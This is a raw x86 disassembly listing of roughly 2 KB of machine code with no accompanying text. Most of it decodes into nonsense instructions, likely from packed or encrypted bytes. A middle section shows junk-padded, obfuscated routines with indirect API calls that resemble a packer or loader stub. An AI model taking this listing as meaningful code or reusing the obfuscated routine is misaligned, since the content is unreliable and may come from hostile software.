  404171:	outs   dx,BYTE PTR ds:[esi]
  404172:	mov    esp,DWORD PTR ds:0xf5fd3929
  404178:	daa    
  404179:	xor    eax,0x2bc4506e
  40417e:	cmc    
  40417f:	jge    0x4041d1
  404181:	inc    edx
  404182:	es (bad) 
  404184:	or     al,0x76
  404186:	xor    dl,cl
  404188:	test   al,0x64
  40418a:	jl     0x40416c
  40418c:	call   0x2aa2:0xcd83c248
  404193:	xchg   ebp,eax
  404194:	push   ss
  404195:	cli    
  404196:	data16 icebp 
  404198:	xchg   ebp,eax
  404199:	cld    
  40419a:	or     dl,BYTE PTR [esi+0x26924672]
  4041a0:	push   ebx
  4041a1:	lea    ebx,[eax-0x34]
  4041a4:	lahf   
  4041a5:	mov    al,ds:0x26c50514
  4041aa:	inc    edx
  4041ab:	(bad)  [ecx+0x24]
  4041ae:	pop    ebx
  4041af:	jns    0x404139
  4041b1:	rcl    DWORD PTR [eax+edx*4-0x7a],1
  4041b5:	in     al,0xcd
  4041b7:	jecxz  0x4041f0
  4041b9:	inc    ebx
  4041ba:	xchg   ebp,eax
  4041bb:	adc    eax,0x16cb9f9a
  4041c0:	(bad)  
  4041c1:	fstp   TBYTE PTR [edi]
  4041c3:	add    ebp,DWORD PTR [edx+0x24]
  4041c6:	int    0x38
  4041c8:	popf   
  4041c9:	das    
  4041ca:	outs   dx,BYTE PTR ds:[esi]
  4041cb:	lods   eax,DWORD PTR ds:[esi]
  4041cc:	adc    al,0xa2
  4041ce:	imul   ebx,DWORD PTR [esi+0x14028d38],0xffffff82
  4041d5:	js     0x40420e
  4041d7:	sti    
  4041d8:	mov    ecx,0x3878796
  4041dd:	xor    al,0xea
  4041df:	sti    
  4041e0:	and    al,0x9
  4041e2:	sbb    al,0x6d
  4041e4:	xor    eax,0x31445d8c
  4041e9:	(bad)  
  4041ea:	mov    ecx,0x2d9239be
  4041ef:	call   0xd47bfc30
  4041f4:	fidivr WORD PTR [ecx]
  4041f6:	out    0x20,al
  4041f8:	sbb    al,0xe
  4041fa:	push   edi
  4041fb:	aam    0x5
  4041fd:	xchg   edi,eax
  4041fe:	pop    ebp
  4041ff:	xchg   ebp,eax
  404200:	ja     0x4041ce
  404202:	sub    ecx,ebp
  404204:	mov    WORD PTR [eax-0x6fc55ba6],cs
  40420a:	pop    ss
  40420b:	xchg   BYTE PTR [edx+0x6e],dh
  40420e:	pop    esp
  40420f:	cmovl  ecx,DWORD PTR [esp+esi*4+0x7d]
  404214:	out    0x10,al
  404216:	mov    ebx,0x17339a21
  40421b:	je     0x4041e9
  40421d:	out    0x21,al
  40421f:	sub    esi,esi
  404221:	and    BYTE PTR [edi-0x6c031616],al
  404227:	scas   al,BYTE PTR es:[edi]
  404228:	mov    cs,WORD PTR [edx-0x2b26d3a3]
  40422e:	cmp    dh,bl
  404230:	sbb    bh,bl
  404232:	inc    eax
  404233:	cli    
  404234:	sbb    BYTE PTR [eax],al
  404236:	repz pushf 
  404238:	xchg   edi,eax
  404239:	lds    edx,FWORD PTR [esp+eiz*2]
  40423c:	std    
  40423d:	cwde   
  40423e:	and    eax,0x4f9819e7
  404243:	sub    al,0x39
  404245:	lds    ebp,FWORD PTR [ebx-0x18]
  404248:	retf   
  404249:	xor    BYTE PTR [esi-0x375e09b1],ch
  40424f:	shl    esp,cl
  404251:	xchg   edi,eax
  404252:	and    al,0x3b
  404254:	cmc    
  404255:	push   0xffffffd3
  404257:	mov    edi,DWORD PTR [eax+0xecd83a5]
  40425d:	xlat   BYTE PTR ds:[ebx]
  40425e:	inc    ebx
  40425f:	add    esp,DWORD PTR [eax-0x12bab9b0]
  404265:	pop    esp
  404266:	xor    edx,ecx
  404268:	push   ss
  404269:	aad    0xa0
  40426b:	mov    al,0xf7
  40426d:	push   ss
  40426e:	je     0x4042ab
  404270:	dec    edi
  404271:	loope  0x4041f9
  404273:	repz push ecx
  404275:	mov    BYTE PTR [ebx+eax*2-0x3c],bl
  404279:	jmp    0xcd37c365
  40427e:	pushf  
  40427f:	imul   BYTE PTR [ebx]
  404281:	jmp    0x21f02297
  404286:	popf   
  404287:	mov    esi,0x3b572ead
  40428c:	sar    al,1
  40428e:	retf   
  40428f:	dec    ebx
  404290:	xor    ebx,DWORD PTR [eax]
  404292:	enter  0x3b86,0x2b
  404296:	aaa    
  404297:	push   eax
  404298:	cdq    
  404299:	stos   BYTE PTR es:[edi],al
  40429a:	test   al,0x6d
  40429c:	adc    eax,0xf07d9b8a
  4042a1:	(bad)  
  4042a2:	mov    dl,0x1a
  4042a4:	stos   BYTE PTR es:[edi],al
  4042a5:	and    bl,BYTE PTR [eax]
  4042a7:	mov    ss,WORD PTR [edx+0x7bcbdaae]
  4042ad:	pslld  mm1,QWORD PTR [edx+0x7d]
  4042b1:	cmp    cl,BYTE PTR [edx-0x2fbabc9e]
  4042b7:	mov    si,WORD PTR [ebx]
  4042ba:	mov    al,ds:0xe4fa0bf7
  4042bf:	mov    al,0x7b
  4042c1:	xchg   esi,eax
  4042c2:	mov    ecx,ecx
  4042c4:	in     eax,dx
  4042c5:	and    dl,BYTE PTR [edx-0x55]
  4042c8:	mov    ah,0xee
  4042ca:	sbb    esi,DWORD PTR [ecx]
  4042cc:	aad    0xd4
  4042ce:	ret    
  4042cf:	and    al,0x9d
  4042d1:	stos   BYTE PTR es:[edi],al
  4042d2:	les    esp,FWORD PTR [edx+0x6bebdf49]
  4042d8:	push   ebx
  4042d9:	push   ebx
  4042da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4042db:	sbb    eax,DWORD PTR [edx]
  4042dd:	push   0x2511dc77
  4042e2:	test   DWORD PTR [ebx],ecx
  4042e4:	mov    edi,0x3017e3f7
  4042e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4042ea:	push   0xfffffff5
  4042ec:	jle    0x4042ff
  4042ee:	dec    esi
  4042ef:	jp     0x404287
  4042f1:	es sbb eax,0x28274481
  4042f7:	pop    ebp
  4042f8:	sbb    DWORD PTR [esi-0x18],0x64453beb
  4042ff:	es jmp 0xd72e:0xb4ad7060
  404307:	pop    ds
  404308:	(bad)  
  404309:	retf   
  40430a:	inc    edi
  40430b:	ja     0x4042f7
  40430d:	iret   
  40430e:	fadd   DWORD PTR [edi]
  404310:	dec    ebp
  404312:	mov    edx,?
  404314:	cli    
  404315:	ja     0x2422562a
  40431b:	cmp    dh,BYTE PTR [edx]
  40431d:	xor    cl,al
  40431f:	xlat   BYTE PTR ds:[ebx]
  404320:	push   edx
  404321:	out    0xab,al
  404323:	mov    cs,WORD PTR [eax]
  404325:	test   al,0x46
  404327:	pop    ecx
  404328:	cmp    esp,edx
  40432a:	jno    0x4042b1
  40432c:	(bad)  
  40432d:	xchg   dh,bh
  40432f:	fld    DWORD PTR [ebx-0x54af3cb5]
  404335:	xlat   BYTE PTR ds:[ebx]
  404336:	test   al,0x1d
  404338:	xor    DWORD PTR [ebp-0x1b00f9a],0xffffffba
  40433f:	sbb    BYTE PTR [ebp+0x69],bh
  404342:	or     eax,0x8b6f8803
  404347:	dec    ebp
  404348:	in     al,dx
  404349:	mov    DWORD PTR ds:0x42299a,0x6672
  404353:	cmp    eax,DWORD PTR [ecx]
  404355:	mov    DWORD PTR ds:0x42289a,0xce0
  40435f:	jne    0x4044cf
  404365:	or     eax,DWORD PTR ds:0x422922
  40436b:	mov    eax,DWORD PTR [ebp-0xc]
  40436e:	cmp    DWORD PTR ds:0x4229ce,0x0
  404375:	mov    ecx,DWORD PTR ds:0x4229b2
  40437b:	not    ecx
  40437d:	jmp    0x4043e2
  404382:	mov    DWORD PTR ds:0x4228ce,0x6b59
  40438c:	mov    DWORD PTR ds:0x4228a6,edi
  404392:	jb     0x4043a7
  404398:	push   0x82d3
  40439d:	call   DWORD PTR ds:0x42a010
  4043a3:	xor    ecx,ecx
  4043a5:	adc    edx,ecx
  4043a7:	or     DWORD PTR ds:0x422992,0x7718
  4043b1:	mov    ecx,DWORD PTR ds:0x422a76
  4043b7:	mov    edx,DWORD PTR ds:0x422ade
  4043bd:	sub    ecx,edx
  4043bf:	xor    ecx,DWORD PTR [ecx+edx*1]
  4043c2:	mov    ecx,DWORD PTR ds:0x4229fe
  4043c8:	xor    edx,edx
  4043ca:	or     edx,DWORD PTR ds:0x422ace
  4043d0:	sub    edx,ecx
  4043d2:	sub    ecx,DWORD PTR [ecx+edx*1]
  4043d5:	movzx  edx,BYTE PTR ds:0x42292e
  4043dc:	add    DWORD PTR ds:0x4229a2,edx
  4043e2:	mov    ecx,DWORD PTR [ebp+0x20]
  4043e5:	movzx  edx,WORD PTR ds:0x4229ba
  4043ec:	or     edx,DWORD PTR ds:0x4229b2
  4043f2:	mov    DWORD PTR ds:0x4229ba,edx
  4043f8:	xor    DWORD PTR [eax],ecx
  4043fa:	mov    eax,DWORD PTR [ebp-0xc]
  4043fd:	mov    ecx,DWORD PTR [ebp+0x18]
  404400:	adc    DWORD PTR ds:0x422992,0x4b0d
  40440a:	mov    edx,DWORD PTR [ebp+0x1c]
  40440d:	shrd   ecx,edx,0x2
  404411:	and    DWORD PTR ds:0x4229ba,0x18b0
  40441b:	mov    DWORD PTR [ebp-0x14],ecx
  40441e:	add    ecx,0x56bc
  404424:	mov    ecx,DWORD PTR [ebp+0x18]
  404427:	xor    DWORD PTR [ebp-0x14],edi
  40442a:	sbb    DWORD PTR ds:0x42291e,0x4252
  404434:	shr    edx,0x2
  404437:	mov    edx,DWORD PTR [ebp+0x1c]
  40443a:	add    DWORD PTR ds:0x4228ce,0x42299e
  404444:	xor    edx,edx
  404446:	and    DWORD PTR ds:0x4228d6,0x4228ea
  404450:	or     edx,DWORD PTR [ebp-0x14]
  404453:	add    DWORD PTR ds:0x42289e,0x4229a2
  40445d:	shl    ecx,0x1e
  404460:	cmp    DWORD PTR ds:0x42294e,0x0
  404467:	mov    ecx,0x1e7
  40446c:	mov    DWORD PTR ds:0x4228ba,0x3be7
  404476:	mov    DWORD PTR ds:0x4229a2,edx
  40447c:	mov    ecx,0x41a9
  404481:	jmp    0x4044cd
  404486:	mov    DWORD PTR ds:0x42297a,0x6783
  404490:	mov    DWORD PTR ds:0x4228ee,0x5319
  40449a:	jl     0x4044b5
  4044a0:	push   DWORD PTR [ebp-0x18]
  4044a3:	call   DWORD PTR ds:0x42a014
  4044a9:	or     ecx,DWORD PTR ds:0x42290e
  4044af:	xor    DWORD PTR ds:0x4228d6,ebx
  4044b5:	xor    DWORD PTR ds:0x4229b2,0x1ac5
  4044bf:	inc    DWORD PTR ds:0x422956
  4044c5:	add    ecx,0x7d03
  4044cb:	not    ecx
  4044cd:	sub    DWORD PTR [eax],edx
  4044cf:	mov    eax,ds:0x4220e0
  4044d4:	mov    ecx,DWORD PTR [ebp-0xc]
  4044d7:	sbb    edx,DWORD PTR ds:0x4228c2
  4044dd:	mov    eax,DWORD PTR [eax]
  4044df:	add    eax,DWORD PTR [ecx]
  4044e1:	mov    edx,DWORD PTR ds:0x42297e
  4044e7:	and    edx,DWORD PTR ds:0x42288e
  4044ed:	mov    DWORD PTR ds:0x42297e,edx
  4044f3:	mov    DWORD PTR [ebp-0x14],eax
  4044f6:	mov    ecx,DWORD PTR [ebx]
  4044f8:	or     DWORD PTR ds:0x422922,edx
  4044fe:	mov    eax,DWORD PTR [ebx+0x4]
  404501:	xor    DWORD PTR ds:0x42299e,ebx
  404507:	jmp    0x404a91
  40450c:	xlat   BYTE PTR ds:[ebx]
  40450d:	mov    edi,0x38f472f4
  404512:	push   eax
  404513:	xor    dl,BYTE PTR [eax+0x268228e]
  404519:	cli    
  40451a:	loopne 0x404590
  40451c:	xchg   ecx,eax
  40451e:	push   ss
  40451f:	push   ss
  404520:	cmp    eax,0x3161604
  404525:	mov    ds:0xb5d3e4fb,al
  40452a:	inc    edx
  40452b:	shr    BYTE PTR [eax],0xca
  40452e:	pop    ss
  40452f:	xchg   esi,eax
  404530:	or     eax,0x6528a733
  404535:	pop    edi
  404536:	ins    DWORD PTR es:[edi],dx
  404537:	js     0x4044f3
  404539:	mov    al,ds:0x16e6ec2a
  40453e:	push   cs
  40453f:	jne    0x40455d
  404541:	cmp    BYTE PTR [edi],dl
  404543:	es push esi
  404545:	nop
  404546:	test   eax,0x19dbf18e
  40454b:	aad    0x1c
  40454d:	xchg   DWORD PTR [eax],ebx
  40454f:	sbb    eax,0xd1b063db
  404554:	mov    al,0x3a
  404556:	cld    
  404557:	sbb    cl,BYTE PTR [ecx+0x67dfd826]
  40455d:	sbb    WORD PTR [edi],0x29b6
  404562:	pop    edi
  404563:	add    bh,al
  404565:	dec    esp
  404566:	xchg   bl,ch
  404568:	xchg   ebx,eax
  404569:	nop
  40456a:	into   
  40456b:	inc    eax
  40456c:	jge    0x4045b9
  40456e:	call   0xf0c3:0x4feb4ec4
  404575:	xor    DWORD PTR [ebp-0x208801dd],ecx
  40457b:	ret    0x20cc
  40457e:	imul   ebp,DWORD PTR [ebp+eiz*1-0x27],0xa1c968c3
  404586:	pusha  
  404587:	adc    BYTE PTR [ebx-0x6dcb1344],bl
  40458d:	das    
  40458e:	jecxz  0x404543
  404590:	scas   al,BYTE PTR es:[edi]
  404591:	pop    edi
  404592:	or     BYTE PTR [ebp-0x2723e37f],bl
  404598:	div    BYTE PTR [edx]
  40459a:	shl    DWORD PTR [ebp+0x7bcc9506],1
  4045a0:	(bad)  
  4045a1:	jnp    0x4045a7
  4045a3:	cmp    DWORD PTR [esp+ebx*8+0x4d],0x5c
  4045a8:	mov    eax,ds:0xb1e4854c
  4045ad:	push   es
  4045ae:	and    edx,edi
  4045b0:	ret    
  4045b1:	add    ebp,eax
  4045b3:	cs or  bh,bh
  4045b6:	mov    ds:0x1a2c9ea0,eax
  4045bb:	popf   
  4045bc:	cmp    BYTE PTR [ebx+0x50],cl
  4045bf:	cs sbb al,bh
  4045c2:	aas    
  4045c3:	mov    ds:0x3988e7ee,eax
  4045c8:	pop    eax
  4045c9:	push   ss
  4045ca:	in     eax,dx
  4045cb:	push   eax
  4045cc:	lahf   
  4045cd:	adc    BYTE PTR [edi+0x454bbc49],dh
  4045d3:	mov    DWORD PTR [edi+0x46],edi
  4045d6:	add    DWORD PTR [ebp+0x10],eax
  4045d9:	sub    al,0x6c
  4045db:	scas   al,BYTE PTR es:[edi]
  4045dc:	adc    eax,0xb5efcf1d
  4045e1:	nop
  4045e2:	xchg   ebp,eax
  4045e3:	mov    BYTE PTR [ebx],bh
  4045e5:	arpl   WORD PTR [edi-0x2a30b5a],si
  4045eb:	jl     0x4045b7
  4045ed:	xchg   edx,eax
  4045ee:	pop    ebp
  4045ef:	xchg   esi,eax
  4045f0:	(bad)  
  4045f1:	push   edi
  4045f2:	cs mov ah,0xb4
  4045f5:	mov    BYTE PTR [edx+0x43],0x39
  4045f9:	inc    ebx
  4045fa:	mov    ecx,0xe69e60c5
  4045ff:	sub    ecx,ecx
  404601:	jno    0x4045e2
  404603:	dec    edx
  404604:	add    ebp,DWORD PTR [ecx+0x38]
  404607:	aam    0x5b
  404609:	xor    ecx,DWORD PTR [ebx+0x26c45e97]
  40460f:	sub    ch,al
  404611:	(bad)  
  404612:	or     DWORD PTR [ebx+0x1f],edi
  404615:	pusha  
  404616:	jecxz  0x404620
  404618:	repz test DWORD PTR [eax-0x24],ebp
  40461c:	push   edi
  40461d:	(bad)  
  40461e:	mov    ah,0xa3
  404620:	retf   0x4b07
  404623:	pusha  
  404624:	push   ebp
  404625:	aam    0xc5
  404627:	pop    esi
  404628:	or     BYTE PTR [ebx],al
  40462a:	mov    esi,0x8f5053f2
  40462f:	xor    edi,DWORD PTR [ebp*4-0xec674d6]
  404636:	pop    ds
  404637:	mov    ebp,0xfaab2454
  40463c:	push   es
  40463d:	fdivr  QWORD PTR [ecx-0x44]
  404640:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404641:	repnz mov al,0xa7
  404644:	mov    ebx,0x2deb778a
  404649:	mov    ebx,0x705d2fec
  40464e:	das    
  40464f:	mov    BYTE PTR [esi],0x4c
  404652:	and    al,0x4b
  404654:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404655:	pop    esp
  404656:	sub    ah,BYTE PTR [edx]
  404658:	fsub   QWORD PTR [edx+0x62]
  40465b:	xor    bh,ah
  40465d:	dec    ebp
  40465e:	lahf   
  40465f:	cmp    edi,ecx
  404661:	and    eax,DWORD PTR [edi-0x60]
  404664:	and    al,BYTE PTR [ebx+0x4c]
  404667:	aam    0xb5
  404669:	fwait
  40466a:	je     0x404698
  40466c:	das    
  40466d:	push   ebp
  40466e:	dec    eax
  40466f:	mov    es,WORD PTR [ecx*4+0x1cbbc0a8]
  404676:	pop    ebp
  404677:	xor    DWORD PTR [ebx+edx*8+0x6],edx
  40467b:	gs cwde 
  40467d:	pusha  
  40467e:	(bad)  
  40467f:	cmp    BYTE PTR [ecx-0x6dbd8dd6],bh
  404685:	add    al,0x6f
  404687:	and    ebp,ebx
  404689:	aas    
  40468a:	xlat   BYTE PTR ds:[ebx]
  40468b:	dec    eax
  40468c:	pop    edx
  40468d:	or     BYTE PTR [ebp-0x5ccab5f5],ch
  404693:	shr    BYTE PTR [edx+0x1abb1189],cl
  404699:	sbb    al,0xc1
  40469b:	out    0x53,al
  40469d:	and    bl,BYTE PTR [ebx]
  40469f:	adc    dh,BYTE PTR ss:[ecx+eiz*2]
  4046a3:	mov    cl,0xb3
  4046a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4046a6:	cwde   
  4046a7:	pop    esi
  4046a8:	jb     0x4046d8
  4046aa:	shr    DWORD PTR [ecx+edx*2],0x6a
  4046ae:	loop   0x4046d5
  4046b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4046b1:	sub    eax,0x888d016c
  4046b6:	xchg   edi,eax
  4046b7:	mov    bh,0x85
  4046b9:	inc    ebx
  4046ba:	push   eax
  4046bb:	repz das 
  4046bd:	xchg   ebp,eax
  4046be:	mov    gs,esp
  4046c0:	mov    ah,0xbf
  4046c2:	dec    esp
  4046c3:	addr16 data16 jbe 0x40465d
  4046c7:	pop    esi
  4046c8:	cwde   
  4046c9:	loope  0x404740
  4046cb:	push   0x6d616b07
  4046d0:	test   DWORD PTR [edx+ebp*2-0x54],esi
  4046d4:	(bad)  
  4046d5:	mov    DWORD PTR ss:[edi+edi*4],ebx
  4046d9:	test   al,0xfe
  4046db:	imul   edx,DWORD PTR [esi+ecx*4+0x6e79b600],0xffffffb4
  4046e3:	or     eax,0x3d041d6c
  4046e8:	mov    cl,0x5
  4046ea:	sahf   
  4046eb:	sub    eax,0xa78e860f
  4046f0:	adc    al,0xa
  4046f2:	outs   dx,BYTE PTR ds:[esi]
  4046f3:	bound  esi,QWORD PTR [edx]
  4046f5:	or     eax,0xf2b5031
  4046fa:	jbe    0x404752
  4046fc:	and    ah,al
  4046fe:	lahf   
  4046ff:	inc    esp
  404700:	mov    eax,0x5f8965b2
  404705:	xor    DWORD PTR [edx*1+0x78b43867],0x2e
  40470d:	ins    BYTE PTR es:[edi],dx
  40470e:	scas   eax,DWORD PTR es:[edi]
  40470f:	inc    ecx
  404710:	call   FWORD PTR [edx-0x552daa9a]
  404716:	fstp   TBYTE PTR [ebx-0x4213cc4]
  40471c:	sub    al,0x24
  40471e:	push   eax
  40471f:	mov    dh,0x4f
  404721:	push   cs
  404722:	cdq    
  404723:	jae    0x4046bd
  404725:	xchg   BYTE PTR [ebx],al
  404727:	push   cs
  404728:	outs   dx,DWORD PTR ds:[esi]
  404729:	fs leave 
  40472b:	jmp    0x40475b
  40472d:	test   eax,0x99bda6e7
  404732:	cmp    cl,ah
  404734:	(bad)  
  404735:	das    
  404736:	or     DWORD PTR [edx+ebx*2],edi
  404739:	mov    ch,BYTE PTR [esi]
  40473b:	das    
  40473c:	inc    edi
  40473d:	mov    ecx,0xd73f36fc
  404742:	cmp    BYTE PTR [ecx-0x7455246],dh
  404748:	jmp    0xaa9676f0
  40474d:	xor    esi,DWORD PTR [edi+0x71]
  404750:	cwde   
  404751:	dec    ebx
  404752:	inc    ecx
  404753:	mov    al,BYTE PTR [eax]
  404755:	push   edx
  404756:	scas   eax,DWORD PTR es:[edi]
  404757:	pusha  
  404758:	mov    DWORD PTR [ecx],0xa17591f0
  40475e:	fcomp  st(7)
  404760:	icebp  
  404761:	and    ecx,0xe517dd76
  404767:	xor    eax,0x6b81e86d
  40476c:	repnz inc ah
  40476f:	test   al,0xb4
  404771:	sbb    esi,edi
  404773:	xchg   ebp,eax
  404774:	test   DWORD PTR [edi-0x7f40a9c5],edx
  40477a:	imul   edi,DWORD PTR [esi],0xffffffa5
  40477d:	pop    ebp
  40477e:	(bad)  
  40477f:	or     eax,0x37cb95ad
  404784:	or     ch,bl
  404786:	addr16 jo 0x4047fe
  404789:	cmp    ch,BYTE PTR [edx+0x356cedec]
  40478f:	jecxz  0x404786
  404791:	mov    edx,0xe5126cdc
  404796:	add    eax,0x6f1d73ba
  40479b:	push   esi
  40479c:	sbb    dh,bl
  40479e:	shl    dh,cl
  4047a0:	imul   edx,DWORD PTR [eax+0x52],0xce7c2cf8
  4047a7:	jbe    0x404748
  4047a9:	pop    esi
  4047aa:	ins    BYTE PTR es:[edi],dx
  4047ab:	adc    ebx,DWORD PTR [ecx-0x1d81fb2]
  4047b1:	xchg   BYTE PTR [esp+esi*8+0x41],ah
  4047b5:	push   edx
  4047b6:	xchg   edx,eax
  4047b7:	bound  esp,QWORD PTR [edx]
  4047b9:	xlat   BYTE PTR ds:[ebx]
  4047ba:	mov    BYTE PTR [edx],bl
  4047bc:	adc    eax,0x16b50852
  4047c1:	inc    ecx
  4047c2:	cmp    ebx,DWORD PTR cs:[ebx+0x2e9ddf32]
  4047c9:	jg     0x4047df
  4047cb:	leave  
  4047cc:	xor    DWORD PTR [ecx+0x1ca7cb39],esi
  4047d2:	cmp    esp,ebp
  4047d4:	xchg   esp,eax
  4047d5:	and    DWORD PTR [esi],eax
  4047d7:	cmp    bl,dl
  4047d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4047da:	jp     0x40483b
  4047dc:	mov    ecx,ss
  4047de:	dec    edx
  4047df:	mov    ch,0x71
  4047e1:	mov    ch,0xd8
  4047e3:	pop    ss
  4047e4:	push   esp
  4047e5:	repnz pop edi
  4047e7:	cld    
  4047e8:	dec    edi
  4047e9:	xchg   edx,eax
  4047ea:	scas   eax,DWORD PTR es:[edi]
  4047eb:	retf   0xf79a
  4047ee:	mov    ch,0xe8
  4047f0:	out    dx,eax
  4047f1:	add    esi,DWORD PTR [ecx+0x1894041f]
  4047f7:	inc    esp
  4047f8:	jmp    0x4047b7
  4047fa:	(bad)  
  4047fc:	test   DWORD PTR [ebx],ebp
  4047fe:	dec    ebp
  4047ff:	test   DWORD PTR [edx+ebx*8+0x78],edx
  404803:	mov    cl,0xe6
  404805:	xchg   esi,eax
  404806:	cmp    ebp,DWORD PTR [ebx+ebp*2-0x22]
  40480a:	mov    al,ds:0xc1a17323
  40480f:	pop    ebp
  404810:	test   eax,0xab5f765
  404815:	mov    bh,0x44
  404817:	jae    0x404878
  404819:	std    
  40481a:	or     al,0xd3
  40481c:	addr16 dec esp
  40481e:	fisub  DWORD PTR [esi-0x2c]
  404821:	add    DWORD PTR [edx],esi
  404823:	mov    dl,dl
  404825:	dec    cl
  404827:	xor    eax,0x51624128
  40482c:	retf   
  40482d:	mov    ecx,0x10bcf92c
  404832:	mov    ecx,0x82fbf105
  404837:	cs cmp dl,al
  40483a:	adc    eax,0x99e66452
  40483f:	pop    ebp
  404840:	jmp    0x25749274
  404845:	sar    ch,0x2a
  404848:	xchg   ecx,eax
  404849:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40484a:	adc    DWORD PTR [ecx+edx*2+0xff206f7],esp
  404851:	pop    es
  404852:	xor    dh,BYTE PTR [ebx]
  404854:	add    al,0xa1
  404856:	or     ah,BYTE PTR [esi+edi*2-0x184c90f7]
  40485d:	cmp    edi,DWORD PTR [edi]
  40485f:	mov    bl,0x56
  404861:	xor    DWORD PTR ds:0xfc667f7e,0x3ff15a04
  40486b:	cld    
  40486c:	xchg   ebx,eax
  40486d:	inc    ecx
  40486e:	scas   al,BYTE PTR es:[edi]
  40486f:	sub    BYTE PTR [edx-0x11],ch
  404872:	std    
  404873:	aaa    
  404874:	(bad)  
  404876:	daa    
  404877:	sub    eax,DWORD PTR [esi+0xad94034]
  40487d:	xlat   BYTE PTR ds:[ebx]
  40487e:	sbb    DWORD PTR [ebx-0xe],ebp
  404881:	mov    dh,0x57
  404883:	aaa    
  404884:	retf   
  404885:	adc    eax,0xd4dea2fa
  40488a:	mov    ds:0xcc1ff190,eax
  40488f:	add    esi,edx
  404891:	mov    DWORD PTR [esi-0x5b],esi
  404894:	inc    ecx
  404895:	cmp    ebp,DWORD PTR [ecx]
  404897:	push   ecx
  404898:	mov    ah,0x28
  40489a:	aad    0x56
  40489c:	(bad)  
  40489d:	sub    al,0xef
  40489f:	xor    al,0x76
  4048a1:	mov    ch,0xa2
  4048a3:	dec    BYTE PTR [edx+0x4158df79]
  4048a9:	pop    ss
  4048aa:	pop    eax
  4048ab:	jp     0x404859
  4048ad:	daa    
  4048ae:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4048b0:	rcl    BYTE PTR [esi],0xc
  4048b3:	push   ecx
  4048b4:	and    ah,BYTE PTR [esi]
  4048b6:	ins    BYTE PTR es:[edi],dx
  4048b7:	cld    
  4048b8:	xchg   ecx,eax
  4048b9:	push   eax
  4048ba:	aas    
  4048bb:	cmp    bh,BYTE PTR [ebx-0x5dcc2782]
  4048c1:	leave  
  4048c2:	xlat   BYTE PTR ds:[ebx]
  4048c3:	shl    DWORD PTR [ecx-0x7260f272],cl
  4048c9:	jmp    0x254b:0x3b2e2a0a
  4048d0:	daa    
  4048d1:	mov    DWORD PTR [esi],esp
  4048d3:	xor    dl,BYTE PTR ds:0xc8026ddb
  4048d9:	je     0x4048c9
  4048db:	push   ebp
  4048dc:	sbb    BYTE PTR [eax+eax*2+0x39],bl
  4048e0:	xchg   ebp,eax
  4048e1:	fsub   QWORD PTR [ebx-0x36414920]
  4048e7:	dec    ecx
  4048e8:	push   ebx
  4048e9:	ss push ss
  4048eb:	jle    0x4048d8
  4048ed:	push   edi
  4048ee:	repnz dec esp
  4048f0:	ins    DWORD PTR es:[edi],dx
  4048f1:	ins    BYTE PTR es:[edi],dx
  4048f2:	or     al,0xc6
  4048f4:	in     al,0x7d
  4048f6:	inc    edi
  4048f7:	push   edi
  4048f8:	mov    al,0x7c
  4048fa:	js     0x404937
  4048fc:	and    al,BYTE PTR [edx-0x1b]
  4048ff:	sub    al,0xb0
  404901:	jo     0x4048e1
  404903:	xchg   ebx,eax
  404904:	push   eax
  404905:	mov    ah,0x39
  404907:	div    DWORD PTR [edx*8+0x9850a96]
  40490e:	adc    BYTE PTR [ebx-0x7ff6ca05],ch
  404914:	and    BYTE PTR [eax-0x27],dl
  404917:	dec    edx
  404918:	adc    bh,BYTE PTR [ebx+edi*1+0x602575c2]
  40491f:	mov    DWORD PTR [edx+0x6],0xba9adf29
  404926:	into   
  404927:	lock fst QWORD PTR [esi+0x76]
  40492b:	inc    esp
  40492c:	jg     0x40493a
  40492e:	ds int3 
  404930:	fmul   QWORD PTR [edx]
  404932:	repz pop ebp
  404934:	jb     0x404921
  404936:	sub    al,BYTE PTR [eax-0x66]
  404939:	or     DWORD PTR [esp+ebx*2-0x701f84dd],0xbf0d7b21
  404944:	clc    
  404945:	cmp    ah,al
  404947:	ret    0xf816
  40494a:	mov    eax,ds:0x3729a395
  40494f:	adc    BYTE PTR [edi+eax*4-0x28f36eb8],ch
  404956:	adc    al,0x5d
  404958:	and    dh,BYTE PTR [ecx-0x33]
  40495b:	out    dx,al
  40495c:	jb     0x40499c
  40495e:	mov    ebp,0x2ceead4d
  404963:	out    0xb2,al
  404965:	sahf   
  404966:	fisttp WORD PTR [edi]
  404968:	mov    ebp,0x7cb04ab
  40496d:	and    eax,0xe00975a4
  404972:	push   edi
  404973:	ds sbb esp,ecx
  404976:	clc    
  404977:	ret    0x60ba
  40497a:	xchg   ecx,eax
  40497b:	push   0x0
  40497d:	pop    edi
  40497e:	fsub   QWORD PTR [ecx+0x0]
  404981:	shl    al,0xa
  404984:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404985:	and    eax,0x28f87155
  40498a:	jge    0x4049a9
  40498c:	dec    edx
  40498d:	xchg   esi,eax
  40498e:	sbb    esi,DWORD PTR [eax+0x2f5aaccc]
  404994:	push   ds
  404995:	pop    ds
  404996:	xchg   esp,eax
  404997:	ret    0xbafa
  40499a:	sbb    DWORD PTR [ebp-0x722a2e1e],eax
  4049a0:	pushf  
  4049a1:	leave  
  4049a2:	ret    
  4049a3:	dec    edi
  4049a4:	xor    BYTE PTR [esi],0x24
  4049a7:	(bad)  
  4049a8:	sbb    esp,eax
  4049aa:	xchg   edx,eax
  4049ab:	icebp  
  4049ac:	cmp    DWORD PTR [ebx],esp
  4049ae:	push   esp
  4049af:	loop   0x40498e
  4049b1:	jp     0x404951
  4049b3:	adc    dl,BYTE PTR [edi+eax*2]
  4049b6:	sbb    eax,0xac080a28
  4049bb:	aad    0x86
  4049bd:	jle    0x4049be
  4049bf:	or     DWORD PTR [eax+0x26],ebp
  4049c2:	push   esi
  4049c4:	sbb    dh,BYTE PTR [ebx-0x21]
  4049c7:	rol    DWORD PTR [ecx+0x54],0xac
  4049cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4049cc:	push   0xffffffab
  4049ce:	scas   al,BYTE PTR es:[edi]
